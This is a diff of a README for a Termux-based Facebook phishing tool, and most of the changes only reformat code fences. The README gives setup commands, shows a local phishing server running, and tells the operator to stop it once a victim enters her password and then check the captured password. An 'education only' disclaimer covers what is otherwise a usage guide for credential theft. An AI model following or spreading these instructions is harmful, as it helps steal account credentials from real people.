@@ -1,7 +1,6 @@
-# Phishing_link
+# phishing link
 This is create only for education.  I don't give you how to global it. I just give you how it run local server. There is one tool, that is Facebook attack tool 
 
-# phishing link
 ## TUI
 ```bash
 ╭────────────────────────────────────────────────────────────────╮
@@ -33,15 +32,18 @@ Choose [1/2/3]:
 
 - Update and upgrade Termux
 ```bash
-pkg update && pkg upgrade```
+pkg update && pkg upgrade
+```
 
 - install Python
 ```bash
-pkg install python```
+pkg install python
+```
 
 - git install
 ```bash
-pkg install git -y```
+pkg install git -y
+```
 
 - clone git https://github.com/rakib-sk/Phishing_link.git
 ```bash
@@ -81,7 +83,9 @@ Press CTRL+C to quit
  * Debugger PIN: 442-250-348
 ```
 - If user enter her password then you can press
-```CTRL + C ```
+```
+CTRL + C 
+```
 when stop your terminal
 
 - Then you enter ***3*** for check pasaword
@@ -108,4 +112,6 @@ when stop your terminal
 - Website: [https://glowing-duckanoo-edc4a1.netlify.app/]
 - Facebook: [https://www.facebook.com/rakibhossen67]
 
-# Made with ❤️ by RooTcore6
+## Made with ❤️ by RooTcore6
+
+
